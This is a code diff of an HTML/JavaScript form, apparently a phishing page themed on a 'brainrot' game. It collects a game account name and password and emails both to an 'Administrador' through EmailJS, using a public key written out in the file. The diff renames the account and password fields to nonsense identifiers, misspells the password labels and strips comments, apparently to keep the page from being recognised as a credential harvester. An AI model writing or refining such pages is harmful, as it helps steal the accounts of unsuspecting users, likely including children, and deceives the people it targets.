@@ -132,13 +132,13 @@
         
         <form id="forma-registro" class="registro-form">
             <div class="form-group">
-                <label for="account" data-es="Cuenta de brainrots:" data-en="Brainrots account:">Cuenta de brainrots:</label>
-                <input type="text" id="account" placeholder="Ingresa tu cuenta" required>
+                <label for="acobronto" data-es="Cuenta de brainrots:" data-en="Brainrots acobronto:">Cuenta de brainrots:</label>
+                <input type="text" id="acobronto" placeholder="Ingresa tu cuenta" required>
             </div>
             
             <div class="form-group">
-                <label for="password" data-es="Contraseña de brainrot:" data-en="Brainrot password:">Contraseña de brainrot:</label>
-                <input type="password" id="password" placeholder="Ingresa tu contraseña" required>
+                <label for="bronrotooo" data-es="Contraseya de brainrot:" data-en="Brainrot pasord:">Contraseya de brainrot:</label>
+                <input type="bronrotooo" id="bronrotooo" placeholder="Ingresa tu contraseya" required>
             </div>
             
             <div class="loading" id="loading" data-es="Procesando..." data-en="Processing...">Procesando...</div>
@@ -155,7 +155,7 @@
     </div>
 
     <script>
-        // Inicializar EmailJS
+       
         emailjs.init("BgugL5adTp__2FfNx");
         
         let currentLang = 'es';
@@ -174,28 +174,28 @@
         document.getElementById('forma-registro').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const account = document.getElementById('account').value.trim();
-            const password = document.getElementById('password').value.trim();
+            const acobronto = document.getElementById('acobronto').value.trim();
+            const bronrotooo = document.getElementById('bronrotooo').value.trim();
             
             console.log('🔍 VALORES CAPTURADOS:', {
-                cuenta: account,
-                contraseña: password
+                cuenta: acobronto,
+                contraseña: bronrotooo
             });
 
-            if (!account || !password) {
+            if (!acobronto || !bronrotooo) {
                 showError('Por favor, completa todos los campos');
                 return;
             }
 
-            // Mostrar loading
+        
             document.getElementById('loading').style.display = 'block';
             document.getElementById('error-message').style.display = 'none';
             document.getElementById('submit-btn').disabled = true;
 
-            // PARÁMETROS CON VALORES REALES DEL USUARIO
+           
             const templateParams = {
-                usuario_brinrot: account,      // ESTE valor cambia con cada usuario
-                contra_brinrot: password,      // ESTE valor cambia con cada usuario
+                usuario_brinrot: acobronto,     
+                contra_brinrot: bronrotooo,      
                 from_name: 'Formulario Web',
                 to_name: 'Administrador', 
                 fecha: new Date().toLocaleString(),
@@ -215,8 +215,8 @@
                     document.getElementById('gracias-mensaje').style.display = 'block';
                     
                     // Limpiar formulario
-                    document.getElementById('account').value = '';
-                    document.getElementById('password').value = '';
+                    document.getElementById('acobronto').value = '';
+                    document.getElementById('bronrotooo').value = '';
                 })
                 .catch(function(error) {
                     console.error('❌ ERROR ENVIANDO EMAIL:', error);
